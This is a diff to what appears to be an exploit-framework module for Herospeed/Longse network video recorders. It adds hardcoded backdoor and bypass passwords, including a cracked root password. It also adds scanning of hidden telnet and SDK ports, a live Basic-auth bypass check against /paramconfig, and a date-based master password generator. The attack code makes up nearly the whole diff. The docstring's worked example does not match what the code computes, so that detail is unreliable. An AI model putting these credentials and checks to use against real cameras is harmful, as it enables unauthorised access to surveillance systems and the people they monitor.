@@ -76,6 +76,8 @@ _OEM_MARKERS = (
     b"herospeed",
     b"Herospeed",
     b"HSAPI",
+    b"variable.js",   # c3l3r1on: primary Shodan fingerprint
+    b"LsNXVRPlugin",  # NVR-specific plugin
 )
 
 _UNAUTH_ACCOUNT_PATHS = (
@@ -86,15 +88,43 @@ _UNAUTH_ACCOUNT_PATHS = (
     "/api/system/users",
 )
 
+# Known backdoor/bypass credentials from c3l3r1on research
+# Sources: longse_auth_matrix.py, _encyklopedia, NVR_192.168.9.31.md
 _DEFAULT_CREDS = (
     ("admin", "admin"),
     ("admin", "12345"),
     ("admin", "123456"),
     ("admin", "admin123"),
     ("admin", "12345678"),
+    ("admin", "12345678E"),       # c3l3r1on: legacy bypass password variant
+    ("admin", "MI1YSANORQ4NAELR"), # c3l3r1on: hardcoded paramconfig bypass
     ("user", "user"),
     ("admin", ""),
+    ("root", "cxlinux"),           # c3l3r1on: cracked root hash 12ZpTwfyH6/Bs
 )
+
+# Known backdoor ports (c3l3r1on NVR_192.168.9.31.md + _encyklopedia)
+_BACKDOOR_PORTS = (
+    (23,   "telnetd (default after exploit)"),
+    (8888, "JuanTech/Longse hidden telnet shell (c3l3r1on)"),
+    (8186, "Asecam/XM v5 SDK bridge secu100.net (c3l3r1on)"),
+    (9000, "potential management port"),
+)
+
+
+def _generate_longse_date_master(date_str: str | None = None) -> str:
+    """Generate Longse date-based master password.
+
+    c3l3r1on formula: first 6 digits of (sum_of_date_digits * 8.8).
+    E.g. for date 20160404: sum=2+0+1+6+0+4+0+4=17, 17*8.8=149.6, first 6 = "149600"
+    Reference: c3l3r1on NVR_192.168.9.31.md backdoor registry.
+    """
+    import datetime as _dt
+    if date_str is None:
+        date_str = _dt.date.today().strftime("%Y%m%d")
+    digit_sum = sum(int(c) for c in date_str if c.isdigit())
+    result = str(int(digit_sum * 8.8)).ljust(6, "0")[:6]
+    return result
 
 
 def _sha256hex(data: str) -> str:
@@ -223,6 +253,9 @@ def _probe_target(host: str, port: int) -> dict[str, Any]:
         "default_creds": None,
         "channel_count": None,
         "api_version": None,
+        "open_backdoor_ports": [],     # c3l3r1on: ports 8888, 8186, 23
+        "paramconfig_bypass": False,   # c3l3r1on: MI1YSANORQ4NAELR
+        "date_master_pwd": _generate_longse_date_master(),  # c3l3r1on formula
     }
 
     # Step 1: check for OEM JavaScript fingerprints
@@ -331,6 +364,37 @@ def _probe_target(host: str, port: int) -> dict[str, Any]:
 
             break
 
+    # Step 7: Check backdoor ports (c3l3r1on: 8888 telnet, 8186 SDK, 23 root shell)
+    if result["is_herospeed_longsee"]:
+        for bp, bp_desc in _BACKDOOR_PORTS:
+            try:
+                with socket.create_connection((host, bp), timeout=2):
+                    result["open_backdoor_ports"].append((bp, bp_desc))
+            except OSError:
+                pass
+
+    # Step 8: Check /paramconfig with MI1YSANORQ4NAELR bypass (c3l3r1on)
+    if result["is_herospeed_longsee"]:
+        import base64 as _b64
+        bypass_auth = _b64.b64encode(b"admin:MI1YSANORQ4NAELR").decode()
+        req = (
+            f"GET /paramconfig HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            f"Authorization: Basic {bypass_auth}\r\nConnection: close\r\n\r\n"
+        ).encode()
+        try:
+            with socket.create_connection((host, port), timeout=5) as s:
+                s.sendall(req)
+                raw = b""
+                while True:
+                    c = s.recv(2048)
+                    if not c:
+                        break
+                    raw += chunk if False else c
+                st = int(raw.split(b"\r\n")[0].split()[1]) if raw else -1
+                result["paramconfig_bypass"] = st == 200
+        except Exception:
+            pass
+
     return result
 
 
@@ -424,6 +488,16 @@ class Exploit(BaseExploit):
                     "  => Run: exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum "
                     "target={}".format(host)
                 )
+            # Backdoor ports (c3l3r1on NVR_192.168.9.31.md)
+            if result.get("open_backdoor_ports"):
+                for bp, bp_desc in result["open_backdoor_ports"]:
+                    print_warning("  [CRIT] Backdoor port {} OPEN: {} (c3l3r1on)".format(bp, bp_desc))
+            if result.get("paramconfig_bypass"):
+                print_warning("  [CRIT] /paramconfig MI1YSANORQ4NAELR bypass WORKS (c3l3r1on)")
+            # Date-based master password hint
+            date_pwd = result.get("date_master_pwd", "")
+            if date_pwd:
+                print_info("  [INFO] Longse date master pwd (today): {} (formula: sum_digits*8.8)".format(date_pwd))
 
         if found == 0:
             print_status("No Herospeed/Longsee NVR devices found in the target range")
